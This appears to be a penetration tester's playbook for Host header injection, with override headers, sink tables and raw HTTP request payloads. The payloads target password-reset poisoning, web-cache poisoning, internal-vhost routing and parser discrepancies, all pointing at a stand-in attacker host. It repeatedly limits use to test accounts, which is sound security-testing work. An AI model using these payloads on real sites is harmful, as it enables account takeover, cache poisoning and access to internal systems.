# Host header injection — override headers + sinks
# TEST account only; drive password-reset for a TEST user you control, never real users.
# A finding requires the attacker host to reach a SECURITY sink (reset link / redirect / cache key /
# routing) — reflection into a non-security context is NOT a finding. Use an OOB host you own.

## Override headers to try (one variable per request; diff vs the real Host)
```
Host: ATTACKER.oob.example
X-Forwarded-Host: ATTACKER.oob.example
X-Host: ATTACKER.oob.example
X-Forwarded-Server: ATTACKER.oob.example
Forwarded: host=ATTACKER.oob.example
X-Forwarded-Proto: http            # scheme downgrade in built links
X-Original-URL: /                  # + X-Rewrite-URL: /   (path override on some stacks)
# duplicate Host — the SECOND may win on the backend behind a proxy that reads the first:
Host: TARGET
Host: ATTACKER.oob.example
# absolute-URI request line overrides Host on some servers:
GET https://ATTACKER.oob.example/reset HTTP/1.1
Host: TARGET
# host with injected userinfo / port (parser-confusion — the right half may be used downstream):
Host: TARGET@ATTACKER.oob.example
Host: ATTACKER.oob.example:443
# leading-space / tab obfuscation to slip past a naive front-end check:
<tab>X-Forwarded-Host: ATTACKER.oob.example
```

## Sinks — where the injected host becomes impact
| sink | confirm | severity |
|---|---|---|
| password-reset link | request reset for TEST user w/ injected host → the emailed token URL points to ATTACKER | High (account takeover) |
| absolute redirect / `Location` | injected host reflected into a 3xx `Location` | Medium (open-redirect / phishing) |
| absolute URLs in body/email | links/scripts/`<base>` built from Host | Medium |
| cache key (unkeyed Host) | poison a shared response → served to a different user (hand to `cache-poisoning`) | High |
| routing / internal vhost | Host routes the request to an internal app (hand to `ssrf`) | varies |
| CSP/absolute script src | injected host in a `<script src>` built from Host → XSS vector | High |

## Password-reset poisoning (the headline — benign)
```
POST /password/reset HTTP/1.1
Host: TARGET
X-Forwarded-Host: ATTACKER.oob.example
Content-Type: application/x-www-form-urlencoded

email=tester@TEST            # a TEST mailbox you control
# → read the reset email you receive; if the token URL host = ATTACKER.oob.example (or a callback
#   lands on ATTACKER.oob.example when the victim would click), the host is attacker-controlled.
# BENIGN: only your own test mailbox; prove host control, do NOT harvest a real user's token.
```

## Confirmation discipline
- A security sink is required — reflection of the header alone is not a finding.
- Cache impact: confirm cross-user via a second anonymous request → defer to `cache-poisoning`.
- Routing/SSRF: use your OOB host; a bare DNS hit is reachability-only → defer to `ssrf`.
- Never trigger resets for real users; benign markers only; redact any captured token to a fingerprint.

---

## Extended arsenal — header → sink/stack mapping

| Header | Who commonly reads it | Typical sink it feeds |
|---|---|---|
| `Host` | app + framework (`HTTP_HOST`, `request.host`) | reset link, absolute URLs, vhost routing |
| `X-Forwarded-Host` | reverse proxies / frameworks behind a proxy | reset link, redirects, cache key |
| `X-Forwarded-Proto` / `X-Forwarded-Scheme` | link/scheme builders | `http://` downgrade in built URLs |
| `X-Forwarded-For` / `X-Real-IP` / `True-Client-IP` / `CF-Connecting-IP` | IP-based ACL / rate-limit / geo / audit log | auth allow-list bypass, log forging, "trusted" source |
| `X-Original-Host` / `X-Host` / `X-Forwarded-Server` | misc middleware | reset link, routing |
| `X-Original-URL` / `X-Rewrite-URL` | IIS/ASP.NET, some gateways | path override → reach a gated path |
| `Forwarded` (RFC 7239) | spec-compliant proxies | host/proto/for in one header |
| absolute-URI request line | origin-server parsing | overrides `Host` on some stacks |

Vary ONE header per request and diff against the real Host; the one that reaches the SINK is the finding.

---

## Extended arsenal — password-reset poisoning variants (TEST mailbox only)

- **Resend / "didn't get it" endpoint** often lacks the host check the first request has — re-test it.
- **Dual-host split**: front-end validates `Host` but the app builds the link from `X-Forwarded-Host`.
- **Referer token leak** (sibling bug): the token in the reset URL leaks to third-party hosts via the
  `Referer` header when the page loads attacker-controlled resources → report as token exposure.
- **Dangling-markup capture**: if the token renders in an HTML email/page, an unclosed attribute can ship
  the rest of the DOM (incl. the token) to an attacker host — prove with a TEST token only.
- Confirm by reading the delivered link's host in YOUR test mailbox; redact the token to a fingerprint.

---

## Extended arsenal — Host as a web-cache key (unkeyed input)

- If `Host`/`X-Forwarded-Host` feeds a cached response but is NOT part of the cache key, one poisoned
  request serves the attacker host to every later visitor of that key.
```
GET /resource HTTP/1.1
Host: TARGET
X-Forwarded-Host: ATTACKER.oob.example      # reflected into a cached absolute URL / <script src>
```
- Scope the probe with a unique cache-buster (`?cb=<rand>`) so you never poison a real key.
- Confirm cross-user: a SECOND request to the SAME buster (no injected header) returns the attacker host
  → it was cached. Read `Age` / `X-Cache` / `CF-Cache-Status` / `Vary` to prove the hit.
- A confirmed cross-user hit → hand to `cache-poisoning`; don't re-report the cache mechanics here.

---

## Extended arsenal — routing / internal-vhost / SSRF via Host

- A front proxy that routes by `Host` may forward an attacker-chosen host to an app never meant to be
  reachable from outside.
```
GET / HTTP/1.1
Host: admin.internal          # or: localhost, 127.0.0.1, a metadata vhost, a neighbour tenant
```
- Split-routing: route on `Host` but build links on `X-Forwarded-Host` (or vice-versa) to reach an
  internal app while keeping a valid session.
- A bare DNS/SSRF hit via Host = reachability only → hand to `ssrf`; a cloud-metadata vhost → `ssrf-cloud`.

---

## Extended arsenal — request-line & duplicate-Host parser discrepancies

- Front-end and back-end may disagree on which host value wins; the SINK consumes the back-end's choice.
```
# absolute-URI in the request line (overrides Host on some origins):
GET https://ATTACKER.oob.example/reset HTTP/1.1
Host: TARGET
# duplicate Host (first vs second may win depending on the parser):
Host: TARGET
Host: ATTACKER.oob.example
# line-folding / indented continuation (legacy parsers):
Host: TARGET
 X-Forwarded-Host: ATTACKER.oob.example
```
- Precedence to probe per stack: absolute-URI > duplicate Host > `X-Forwarded-Host` > `Host`. The value
  that reaches the SINK (not the one merely echoed) is the finding; change ONE thing at a time to attribute it.
